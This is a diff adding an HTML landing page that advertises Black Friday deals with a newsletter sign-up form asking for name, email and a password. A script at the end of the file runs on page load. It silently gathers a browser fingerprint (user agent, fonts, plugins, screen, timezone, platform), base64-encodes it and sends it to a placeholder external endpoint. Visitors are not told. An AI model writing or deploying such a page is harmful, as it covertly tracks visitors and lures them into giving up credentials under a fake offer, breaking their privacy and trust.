@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hi, im a company! - Buy my product!</title>
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap");
+
+    body {
+      display: flex;
+      justify-content: center;
+      padding: 3rem 0;
+      font-family: "Poppins", sans-serif;
+      font-size: 1rem;
+      color: white;
+      background-color: #ff7a7a;
+    }
+
+    main {
+      max-width: 350px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .intro {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      width: 100%;
+      margin-bottom: 3rem;
+    }
+
+    .title {
+      padding: 1rem;
+      font-size: 1.75rem;
+    }
+
+    .sign-up {
+      width: 100%;
+    }
+
+    .sign-up-para {
+      padding: 1rem 5rem;
+      margin-bottom: 1.75rem;
+      border-radius: 0.8rem;
+      box-shadow: 0 8px 0px rgba(0 0 0/0.15);
+      background-color: #7138cc;
+      text-align: center;
+    }
+
+    .sign-up-form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 1.2rem;
+      border-radius: 0.8rem;
+      box-shadow: 0 8px 0px rgba(0 0 0/0.15);
+      color: #b9b6d3;
+      background-color: white;
+    }
+
+    .form-input {
+      width: 100%;
+      margin-bottom: 1em;
+      position: relative;
+    }
+
+    .form-input span {
+      position: absolute;
+      top: 10%;
+      right: 0;
+      padding: 0 0.65em;
+      border-radius: 50%;
+      background-color: #ff7a7a;
+      color: white;
+      display: none;
+    }
+
+    .form-input.warning span {
+      display: inline-block;
+    }
+
+    .form-input input {
+      width: calc(100% - 20px);
+      padding: 10px;
+      border: 2px solid rgba(185, 182, 211, 0.25);
+      border-radius: 0.5em;
+      font-weight: 600;
+      color: #3e3c49;
+    }
+
+    .form-input input:focus {
+      outline: none;
+      border: 2px solid #b9b6d3;
+    }
+
+    .form-input.warning input {
+      border: 2px solid #ff7a7a;
+    }
+
+    .form-input p {
+      margin: 0.2em 0.75em 0 0;
+      display: none;
+      font-size: 0.75rem;
+      text-align: right;
+      font-style: italic;
+      color: #ff7a7a;
+    }
+
+    .form-input.warning p {
+      display: block;
+    }
+
+    .submit-btn {
+      cursor: pointer;
+      width: 100%;
+      padding: 1em;
+      margin-bottom: 1em;
+      border: none;
+      border-bottom: 5px solid #31bf81;
+      border-radius: 0.5em;
+      background-color: #38cc8c;
+      color: white;
+      font-weight: 600;
+      text-transform: uppercase;
+    }
+
+    .submit-btn:hover {
+      background-color: #5dd5a1;
+    }
+
+    .form-term {
+      margin-bottom: 0.75em;
+      font-size: 0.8rem;
+      text-align: center;
+    }
+
+    .form-term span {
+      font-weight: 700;
+      color: #ff7a7a;
+    }
+    
+    @media (min-width: 768px) {
+      body {
+        align-items: center;
+        min-height: 100vh;
+      }
+
+      main {
+        max-width: 100vw;
+        flex-direction: row;
+        justify-content: center;
+      }
+
+      .intro {
+        align-items: flex-start;
+        text-align: left;
+        width: 45%;
+        margin-right: 1rem;
+      }
+
+      .title {
+        padding: 0;
+        margin-bottom: 2rem;
+        font-size: 3rem;
+        line-height: 1.25em;
+      }
+
+      .sign-up {
+        width: 45%;
+      }
+
+      .sign-up-form {
+        padding: 1.75rem;
+      }
+
+      .sign-up-form input {
+        padding-left: 1.5em;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <main>
+    <!-- intro section -->
+    <section class="intro">
+      <h1 class="title">Black Friday Deals</h1>
+      <p>Get up to 50% off on all our products and services. Hurry up, the offer ends in 24 hours.</p>
+    </section>
+
+    <!-- sign-up section -->
+    <section class="sign-up">
+      <p class="sign-up-para">Sign up for our newsletter and get 10% off your first purchase</p>
+      <!-- the form itself -->
+      <form class="sign-up-form">
+        <div class="form-input">
+          <input type="text" name="first-name" id="first-name" placeholder="First Name" required>
+          <span>!</span>
+          <p class="warning">First name cannot be empty</p>
+        </div>
+
+        <div class="form-input">
+          <input type="text" name="last-name" id="last-name" placeholder="Last Name" required>
+          <span>!</span>
+          <p class="warning">Last name cannot be empty</p>
+        </div>
+
+        <div class="form-input">
+          <input type="email" name="email" id="email" placeholder="Email Address" required>
+          <span>!</span>
+          <p class="warning">Looks like this is not an email</p>
+        </div>
+
+        <div class="form-input">
+          <input type="Password" name="Password" id="Password" placeholder="Password" required>
+          <span>!</span>
+          <p class="warning">Password cannot be empty</p>
+        </div>
+
+        <input class="submit-btn" type="submit" value="Claim your offer">
+        <p class="form-term">By clicking the button, you are agreeing to our <span>Terms and Services</span> </p>
+      </form>
+    </section>
+  </main>
+</body>
+<script>
+    function sendGetRequest(url) {
+        fetch(url, {
+            method: 'GET'
+        })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log(data);
+            })
+            .catch(error => {
+                console.error('There was a problem with the GET request:', error);
+            });
+    }
+
+    function sendData() {
+        // Get user agent string
+        var userAgent = navigator.userAgent;
+
+        // Get screen resolution
+        var screenWidth = window.screen.width;
+        var screenHeight = window.screen.height;
+        var screenResolution = screenWidth + 'x' + screenHeight;
+
+        // Get installed fonts
+        var installedFonts = [];
+        var fontList = document.fonts;
+        for (var i = 0; i < fontList.length; i++) {
+            installedFonts.push(fontList[i].family);
+        }
+
+        // Get browser plugins
+        var browserPlugins = [];
+        var pluginList = navigator.plugins;
+        for (var i = 0; i < pluginList.length; i++) {
+            browserPlugins.push(pluginList[i].name);
+        }
+
+        // Get timezone
+        var timezone = new Date().getTimezoneOffset();
+
+        // Get language
+        var language = navigator.language;
+
+        // Get color depth
+        var colorDepth = window.screen.colorDepth;
+
+        // Get platform
+        var platform = navigator.platform;
+
+        // Get WebGL fingerprint
+        var webglFingerprint = 'TODO';
+
+        // Get audio fingerprint
+        var audioFingerprint = 'TODO';
+
+        // Create data object
+        var data = {
+            userAgent: userAgent,
+            screenResolution: screenResolution,
+            installedFonts: installedFonts,
+            browserPlugins: browserPlugins,
+            timezone: timezone,
+            language: language,
+            colorDepth: colorDepth,
+            platform: platform,
+            webglFingerprint: webglFingerprint,
+            audioFingerprint: audioFingerprint
+        };
+        // Send data via POST request
+        var encodedData = btoa(JSON.stringify(data));
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '{CHANGE_ME_TO_PUBLIC_URL}/fingerprint', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(encodedData));
+    }
+
+    sendData();
+</script>
+</html>
